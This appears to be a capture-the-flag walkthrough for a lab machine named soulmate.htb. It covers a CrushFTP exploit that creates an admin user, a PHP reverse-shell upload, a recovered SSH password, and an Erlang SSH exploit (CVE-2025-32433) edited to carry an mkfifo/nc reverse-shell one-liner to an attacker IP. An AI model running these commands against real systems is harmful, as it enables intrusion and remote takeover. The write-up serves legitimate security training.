# 10.10.11.87

## NMAP Scan
- 22 and 80 open

## FootHold
- 80 has a soulmate site that allows you to create a profile and a upload a pic
- no file upload tricks work
- files ending with JPG/PNG/GIF are uploaded as resp files
- directory enum gives nothing
- filelists enum gives nothing
- subdomain enum gives nothing
- vhost enum gives `ftp.soulmate.htb`
    - add this to `/etc/hosts`
- we have a crushftp server using v11.3.0
- using this cve - https://www.exploit-db.com/exploits/52295
    - `python3 crushftp-11.3.1.py --target ftp.soulmate.htb --exploit --new-user haxor --password haxor1231 --port 80`
    - this will create a user for you
- in the crushftp app, go to `Admin > User Mgmt > haxor` and add the `app` folder to it.
- now, go back to `Files`
    - there is a ssh key file for host but that does not work for `ben`
    - there is a passfile and even that does not work.
    - add your `php-reverse-shell.php` to the WebProd folder.
- start the nc listener, and go to `soulmate.htb/php-reverse.shell.php` which should give a shell as `www-data`
- use `python3 -c 'import pty; pty.spawn("/bin/bash")'` to stabalize the shell
- running linpeas
    - /opt has some stuff
    - `/etc/ssh` has host keys but not accessible
        - sshd config points to ben and `/usr/local/lib/erlang`
    - `ftp.soulmate.htb` is running on `9090`
        ```
        root        1089  0.0  0.0   6896  2996 ?        Ss   Oct20   0:00 /usr/sbin/cron -f -P 
        root        1110  0.0  0.1  10344  4056 ?        S    Oct20   0:00  _ /usr/sbin/CRON -f -P 
        root        1132  0.0  0.0   2892  1004 ?        Ss   Oct20   0:00      _ /bin/sh -c /root/scripts/clean-web.sh
        root        1133  0.0  0.0   7372  3568 ?        S    Oct20   0:00          _ /bin/bash /root/scripts/clean-web.sh
        root        1134  0.0  0.0   3104  1920 ?        S    Oct20   0:00              _ inotifywait -m -r -e create --format %w%f /var/www/soulmate.htb/public          
        root        1135  0.0  0.0   7372  1740 ?        S    Oct20   0:00              _ /bin/bash /root/scripts/clean-web.sh 
        ```
    - inotifywait full path not specified

    - `/usr/local/lib/erlang` seen many times
    - found a password in `/usr/local/lib/erlang_login/login.escript`
    ```
            {auth_methods, "publickey,password"},
                                                        
            {user_passwords, [{"ben", "HouseH0ldings998"}]},
    ```
- ssh as ben & get user.txt - `a24d9c6abca8c458c46ebc2e50996394`

## Privesc
- working on the `cleanup.sh` lead
- inotifywait does not specify the full path
- that was a **dead end**
- `netstat -tunlp | grep LISTEN` had many ports open
- `nc 127.0.0.1 2222` gave `SSH-2.0-Erlang/5.2.9`
- looking for an exploit, we see that https://medium.com/@RosanaFS/erlang-otp-ssh-cve-2025-32433-tryhackme-e410df5f1b53 and https://github.com/platsecurity/CVE-2025-32433?tab=readme-ov-file are there
- git clone it
- `nano CVE-2025-32433.py` 
```
command = 'os:cmd("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.67 9494 >/tmp/f").'
```
- the `.` at the end of the command is important or else the shell keep listening and doesnt execute.
- `nc -nvlp 9494`
- `python3 CVE-2025-32433.py`
- get the root shell back - `54d5b75e29ae7ef2113cf8df1f2cffb9`
